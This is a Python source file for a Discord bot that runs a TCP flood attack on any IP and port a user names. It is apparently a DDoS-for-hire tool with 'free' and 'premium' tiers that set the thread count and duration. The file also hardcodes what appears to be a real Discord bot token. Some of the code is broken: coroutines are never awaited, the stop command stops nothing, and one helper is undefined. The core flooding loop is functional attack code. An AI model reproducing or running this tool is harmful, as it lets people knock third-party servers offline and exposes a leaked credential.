from discord.ext import commands
import discord
import threading
import time
import socket

# Your bot token
TOKEN = 'OTA0MzY2MTcwMTQ3MjU4Mzg4.GyPYc2.Udi-c777-ehATTMjhkDEHdf5zCUDrpWCqw4qv0'
intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

# Function to send TCP requests
def send_tcp_requests(target_ip, port, bytes_to_send, stop_event):
    while not stop_event.is_set():
        try:
            # Create a socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to the target server
            s.connect((target_ip, port))

            # Create the request
            request = b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n"
            request += b"A" * bytes_to_send  # Add the specified number of bytes to the request
            s.send(request)

            # Close the socket
            s.close()

        except Exception as e:
            print("An error occurred:", str(e))
            break

# Function to start the attack
def start_attack(ctx, ip, port, bytes_to_send, num_threads, connections_per_thread, duration, method):
    try:
        # Resolve domain to IP address
        target_ip = socket.gethostbyname(ip)
    except socket.gaierror as e:
        ctx.send("Failed to resolve domain. Error: " + str(e))
        return

    # Create a stop event
    stop_event = threading.Event()

    # Start the threads
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=send_tcp_requests, args=(target_ip, port, bytes_to_send, stop_event))
        t.start()
        threads.append(t)

    # Send a message to indicate the attack has started
    embed = discord.Embed(title=f"{method.capitalize()} Attack Started", description=f"Attacking {ip}:{port} with {num_threads} threads and {connections_per_thread} connections per thread.", color=discord.Color.green())
    ctx.send(embed=embed)

    # Wait for the specified duration
    time.sleep(duration)

    # Set the stop event to stop the threads
    stop_event.set()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    # Send a message to indicate the attack has stopped
    embed = discord.Embed(title=f"{method.capitalize()} Attack Stopped", description=f"Stopped attacking {ip}:{port}.", color=discord.Color.red())
    ctx.send(embed=embed)

# Function to stop the attack
def stop_attack(ctx):
    # Create a stop event
    stop_event = threading.Event()

    # Set the stop event to stop the threads
    stop_event.set()

    # Send a message to indicate the attack has stopped
    embed = discord.Embed(title="Attack Stopped", description="Stopped the current attack.", color=discord.Color.red())
    ctx.send(embed=embed)

# Function to resolve the domain
def resolve_domain(ctx, ip):
    try:
        # Resolve domain to IP address
        target_ip = socket.gethostbyname(ip)

        # Get server info
        server_info = get_server_info(target_ip)

        # Send a message with the server info
        embed = discord.Embed(title="Server Information", description=f"IP: {target_ip}\nOnline Players: {server_info['players']['online']}\nMOTD: {server_info['description']['text']}\nPing: {server_info['ping']} ms\nProtocol: {server_info['version']['protocol']}", color=discord.Color.blue())
        ctx.send(embed=embed)

    except socket.gaierror as e:
        ctx.send("Failed to resolve domain. Error: " + str(e))

# Command to start the attack

@bot.command()
async def free(ctx, ip: str, port: int):
    await start_attack(ctx, ip, port, 0, 200, 10000000000, 60, 'free')

@bot.command()
async def premium(ctx, ip: str, port: int):
    await start_attack(ctx, ip, port, 0, 480, 100000000000, 120, 'premium')

# Command to stop the attack
@bot.command()
async def stop(ctx):
    stop_attack(ctx)

# Command to resolve the domain
@bot.command()
async def resolve(ctx, ip: str):
    resolve_domain(ctx, ip)

# Start the bot
bot.run(TOKEN)
